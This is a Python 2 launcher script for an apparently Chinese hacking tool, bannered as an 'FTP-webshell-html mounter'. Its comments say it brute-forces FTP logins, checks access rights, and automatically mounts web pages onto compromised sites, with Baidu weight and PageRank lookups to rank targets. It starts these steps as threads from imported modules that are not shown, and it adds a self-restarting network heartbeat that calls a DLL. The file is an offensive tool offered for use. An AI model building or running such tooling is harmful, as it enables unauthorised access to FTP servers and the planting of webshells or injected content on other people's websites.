#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#FTP采集爆破
import Cftp  #自动挂载WEB页面
import CpasswordFTP  #自动检测权限
import wwwIP_baiduQZ_PR  #百度权重   PR查询
import time
import ctypes   #DLL调用
import thread

def Crun():  #启动
    thrint=0
    ###########################
    #百度权重   PR查询
    baiduQZ_PR_threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        thrint=thrint+1
        baiduQZ_PR_threads.append(wwwIP_baiduQZ_PR.CS_QZ_RP(thrint))

    for thread in baiduQZ_PR_threads:   #不理解这是什么意思    是结束线程吗
        time.sleep(1)
        thread.start()  #start就是开始线程
    ###########################
    #自动挂载WEB页面
    Cftp_threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        thrint=thrint+1
        Cftp_threads.append(Cftp.CS_linkftp(thrint))

    for thread in Cftp_threads:
        time.sleep(1)
        thread.start()  #start就是开始线程
    ###########################
    #自动检测权限
    CpasswordFTP_threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        thrint=thrint+1
        CpasswordFTP_threads.append(CpasswordFTP.CS_passwordFTP())

    for thread in CpasswordFTP_threads:
        time.sleep(1)
        thread.start()  #start就是开始线程
##################################################
import sys
import os
import atexit
def close():  #自动重启本程序
    try:
        print u"------------------自动重启本程序------------------"
        time.sleep(10)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        print u"------------------自动重启本程序---异常------------------"
        sys.exit(0)  #结束进程

def intet_close():
    dll=ctypes.CDLL("internet_close.dll")
    add=dll.Fun_Internet    #DLL中的函数
    #add.argtypes=[ctypes.c_int,ctypes.c_int]  #参数类型
    add.restypes=ctypes.c_int                 #返回值类型
    INIclose=0
    while 1:
        INIclose=INIclose+1
        if INIclose>=100:  #1.5小时自动重启一次程序
            INIclose=0
            time.sleep(10)
            atexit.register(close)#自动重启本程序
        try:   #检测网络连接状态
            Ainternet=add()
            if str(Ainternet)=="0":
                print u"----网络无连接自动重启程序本身不在线----"
                time.sleep(1)
                atexit.register(close)#自动重启本程序
            else:
                result = {
                    "1" : u"在线：拨号上网",
                    "2" : u"在线：通过局域网",
                    "3" : u"在线：代理",
                    "4" : u"MODEM被其他非INTERNET连接占用",
                    "5" : u"在线：连接方式不明"
                }
                print u"----心跳",INIclose,u"次----",result.get(str(Ainternet)),time.strftime('%Y.%m.%d-%H.%M.%S')

        except:
            print u"--------网络无连接自动重启程序本身--------"
            time.sleep(3)
            atexit.register(close)#自动重启本程序
        time.sleep(20)


def Aintet_close():
    dll=ctypes.CDLL("internet_close.dll")
    add=dll.Fun_Internet    #DLL中的函数
    #add.argtypes=[ctypes.c_int,ctypes.c_int]  #参数类型
    add.restypes=ctypes.c_int                 #返回值类型

    try:   #检测网络连接状态
        Ainternet=add()
        if str(Ainternet)=="0":
            print u"----网络无连接自动重启程序本身不在线----"
            time.sleep(1)
            atexit.register(close)#自动重启本程序
            return 0
        else:
            result = {
                "1" : u"在线：拨号上网",
                "2" : u"在线：通过局域网",
                "3" : u"在线：代理",
                "4" : u"MODEM被其他非INTERNET连接占用",
                "5" : u"在线：连接方式不明"
            }
            print u"----",result.get(str(Ainternet)),time.strftime('%Y.%m.%d-%H.%M.%S')
            return 1
    except:
        print u"--------网络无连接自动重启程序本身--------"
        return 0



if __name__=='__main__':
    print u"---------------------------------------------------------------------"
    print u"            欢迎使用FTP-webshell-html挂载器-----BY：落雪               "
    print u"      谢谢灰帽程序员论坛对本软件技术支持--http://hmhacker.org/           "
    print u"                落雪网络技术--QQ交流群293663651                        "
    print u"     自动挂载WEB页面--自动检测权限--百度权重--PR查询--网站IP地址           "
    print u"----------------------------------------------------------------------"
    time.sleep(5)
    try:
        if Aintet_close():
            print u"在线"
            Crun()  #启动
            thread.start_new_thread(intet_close())#检测网络在线状态
        else:
            print u"不在线---自动重启本程序延时10S"
            time.sleep(10)
            atexit.register(close)#自动重启本程序
    except:
    #    user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
    #    user32.MessageBoxA(0, u'内容', u'标题', 0)   # 调用MessageBoxA函数
        time.sleep(10)
        atexit.register(close)


